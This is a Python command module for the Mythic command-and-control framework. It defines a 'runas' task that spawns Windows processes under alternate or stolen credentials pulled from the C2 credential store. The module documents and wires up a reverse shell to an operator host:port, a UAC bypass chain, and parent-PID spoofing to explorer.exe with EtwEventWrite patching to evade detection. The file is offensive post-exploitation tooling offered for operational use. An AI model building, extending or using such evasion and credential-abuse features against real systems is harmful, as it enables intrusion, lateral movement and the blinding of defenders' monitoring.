from mythic_container.MythicCommandBase import *


class RunAsArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="credential",
                cli_name="Credential",
                display_name="Credential",
                type=ParameterType.Credential_JSON,
                limit_credentials_by_type=["plaintext"],
                parameter_group_info=[
                    ParameterGroupInfo(
                        group_name="credential_store",
                        required=True,
                        ui_position=1,
                    )
                ],
            ),
            CommandParameter(
                name="username",
                cli_name="username",
                display_name="Username",
                type=ParameterType.String,
                description="Format: DOMAIN\\user, user@domain, or user (local)",
                parameter_group_info=[
                    ParameterGroupInfo(required=True, ui_position=1)
                ],
            ),
            CommandParameter(
                name="password",
                cli_name="password",
                display_name="Password",
                type=ParameterType.String,
                parameter_group_info=[
                    ParameterGroupInfo(required=False, ui_position=2)
                ],
            ),
            CommandParameter(
                name="remote",
                cli_name="r",
                display_name="Remote (host:port)",
                type=ParameterType.String,
                default_value="",
                description="Redirect stdin/stdout/stderr to host:port (reverse shell). Leave empty to capture output locally.",
                parameter_group_info=[
                    ParameterGroupInfo(group_name="credential_store", required=False, ui_position=5),
                    ParameterGroupInfo(required=False, ui_position=5),
                ],
            ),
            CommandParameter(
                name="logon_type",
                cli_name="l",
                display_name="Logon Type",
                type=ParameterType.ChooseOne,
                choices=["2 - Interactive", "3 - Network", "4 - Batch", "5 - Service", "8 - NetworkCleartext", "9 - NewCredentials"],
                default_value="2 - Interactive",
                description=(
                    "2=Interactive (CreateProcessWithLogonW, full token), "
                    "3=Network (CreateProcessWithLogonW, no local creds), "
                    "4=Batch (LogonUser+CreateProcessAsUser, requires SeBatchLogonRight on target), "
                    "5=Service (LogonUser+CreateProcessAsUser, requires SeServiceLogonRight on target), "
                    "8=NetworkCleartext (CreateProcessWithLogonW, creds in cleartext), "
                    "9=NewCredentials (CreateProcessWithLogonW, inherits current token + network creds)"
                ),
                parameter_group_info=[
                    ParameterGroupInfo(group_name="credential_store", required=False, ui_position=6),
                    ParameterGroupInfo(required=False, ui_position=6),
                ],
            ),
            CommandParameter(
                name="application",
                cli_name="application",
                display_name="Application",
                type=ParameterType.String,
                default_value="cmd.exe",
                description="Path to the application to launch.",
                parameter_group_info=[
                    ParameterGroupInfo(group_name="credential_store", required=True, ui_position=3),
                    ParameterGroupInfo(required=True, ui_position=3),
                ],
            ),
            CommandParameter(
                name="arguments",
                cli_name="arguments",
                display_name="Arguments",
                type=ParameterType.String,
                default_value="",
                description="Arguments passed to the application.",
                parameter_group_info=[
                    ParameterGroupInfo(group_name="credential_store", required=False, ui_position=4),
                    ParameterGroupInfo(required=False, ui_position=4),
                ],
            ),
            CommandParameter(
                name="bypass_uac",
                cli_name="b",
                display_name="Bypass UAC (-b)",
                type=ParameterType.Boolean,
                default_value=False,
                description=(
                    "UAC bypass: LogonUser (non-filtered logon type) + copy IL + strip DACL + "
                    "ImpersonateLoggedOnUser + CreateProcessWithLogonW(LOGON_NETCREDENTIALS_ONLY). "
                    "Requires direct LogonUser network calls to succeed (SeTcbPrivilege or permissive LSA policy). "
                    "Fails with err 1326 on hardened Windows 10/11 where only SecLogon (SYSTEM) can use network logon types. "
                    "Types 2/9 silently use NetworkCleartext (8) internally."
                ),
                parameter_group_info=[
                    ParameterGroupInfo(group_name="credential_store", required=False, ui_position=7),
                    ParameterGroupInfo(required=False, ui_position=7),
                ],
            ),
            CommandParameter(
                name="ppid_spoof",
                cli_name="ppid_spoof",
                display_name="PPID Spoof",
                type=ParameterType.Boolean,
                default_value=False,
                description=(
                    "Spoof parent PID to explorer.exe and patch EtwEventWrite before resume. "
                    "Only effective for logon types 3/4/5/8 (CreateProcessW path). "
                    "Types 2/9 get ETW patch only (CreateProcessWithLogonW is incompatible with PPID spoof)."
                ),
                parameter_group_info=[
                    ParameterGroupInfo(group_name="credential_store", required=False, ui_position=8),
                    ParameterGroupInfo(required=False, ui_position=8),
                ],
            ),
        ]

    async def parse_arguments(self):
        if self.command_line.strip().startswith("{"):
            self.load_args_from_json_string(self.command_line)
            return
        import shlex, re
        try:
            parts = shlex.split(self.command_line)
        except ValueError:
            parts = self.command_line.split()
        if len(parts) < 2:
            raise Exception("Usage: runas user pass [logon_type] [app] [args] [host:port]")
        logon_map = {
            "2": "2 - Interactive", "3": "3 - Network", "4": "4 - Batch",
            "5": "5 - Service",     "8": "8 - NetworkCleartext", "9": "9 - NewCredentials",
        }
        self.add_arg("username", parts[0])
        self.add_arg("password", parts[1])
        remaining = list(parts[2:])
        # extract -l <logon_type> flag if present
        if "-l" in remaining:
            li = remaining.index("-l")
            if li + 1 < len(remaining) and remaining[li + 1] in logon_map:
                self.add_arg("logon_type", logon_map[remaining[li + 1]])
                remaining = remaining[:li] + remaining[li + 2:]
        # extract -r <host:port> flag if present
        if "-r" in remaining:
            ri = remaining.index("-r")
            if ri + 1 < len(remaining):
                self.add_arg("remote", remaining[ri + 1])
                remaining = remaining[:ri] + remaining[ri + 2:]
        # extract -b flag (bypass_uac)
        if "-b" in remaining:
            self.add_arg("bypass_uac", True)
            remaining = [x for x in remaining if x != "-b"]
        if remaining:
            self.add_arg("application", remaining[0])
        if len(remaining) > 1:
            self.add_arg("arguments", " ".join(remaining[1:]))


class RunAsCommand(CommandBase):
    cmd = "runas"
    needs_admin = False
    help_cmd = "runas DOMAIN\\user Password123! cmd.exe [args] [-r host:port] [-l logon_type] [-b]"
    description = (
        "Spawn a process under alternate credentials. "
        "Types 2/9: CreateProcessWithLogonW. Types 3/4/5/8: LogonUser + SetThreadToken (requires SeImpersonatePrivilege). "
        "Captures stdout/stderr via anonymous pipes, or redirects to a remote host:port. "
        "Optional ppid_spoof: PPID spoof to explorer.exe + ETW patch (types 3/4/5/8), ETW patch only (types 2/9)."
    )
    version = 2
    author = "@goultarde"
    argument_class = RunAsArguments
    attackmapping = ["T1134", "T1134.002"]
    attributes = CommandAttributes(
        supported_os=[SupportedOS.Windows],
    )

    async def create_go_tasking(
        self, taskData: PTTaskMessageAllData
    ) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )

        if taskData.args.get_parameter_group_name() == "credential_store":
            cred = taskData.args.get_arg("credential")
            account = cred.get("account", "") if isinstance(cred, dict) else ""
            realm   = cred.get("realm",   "") if isinstance(cred, dict) else ""
            password = cred.get("credential", "") if isinstance(cred, dict) else ""
        else:
            username = taskData.args.get_arg("username") or ""
            password = taskData.args.get_arg("password") or ""
            taskData.args.remove_arg("username")
            taskData.args.remove_arg("password")
            if "\\" in username:
                realm, account = username.split("\\", 1)
            elif "@" in username:
                realm = ""
                account = username
            else:
                realm = ""
                account = username

        # Flatten fields: C agent expects top-level account/realm/credential keys
        taskData.args.remove_arg("credential")
        taskData.args.add_arg("account",    account,  type=ParameterType.String)
        taskData.args.add_arg("realm",      realm,    type=ParameterType.String)
        taskData.args.add_arg("credential", password, type=ParameterType.String)

        # Extract the number from "2 - Interactive" or bare digit from CLI (-l 3)
        logon_choice = taskData.args.get_arg("logon_type") or "2"
        logon_type_int = int(logon_choice.strip().split(" ")[0])
        taskData.args.remove_arg("logon_type")
        taskData.args.add_arg("logon_type", logon_type_int, type=ParameterType.Number)

        target = f"{realm}\\{account}" if realm else account
        app    = taskData.args.get_arg("application")
        args   = taskData.args.get_arg("arguments") or ""
        remote = taskData.args.get_arg("remote") or ""
        logon_labels = {2: "Interactive", 3: "Network", 4: "Batch", 5: "Service", 8: "NetworkCleartext", 9: "NewCredentials"}
        mode = logon_labels.get(logon_type_int, str(logon_type_int))

        bypass_uac = taskData.args.get_arg("bypass_uac") or False
        ppid_spoof = taskData.args.get_arg("ppid_spoof") or False
        display = f"{target} -> {app} {args} [{mode}]"
        if remote:
            display += f" -> {remote}"
        if bypass_uac:
            display += " [bypass_uac]"
        if ppid_spoof:
            display += " [ppid_spoof]"
        response.DisplayParams = display
        return response

    async def process_response(
        self, task: PTTaskMessageAllData, response: any
    ) -> PTTaskProcessResponseMessageResponse:
        return PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
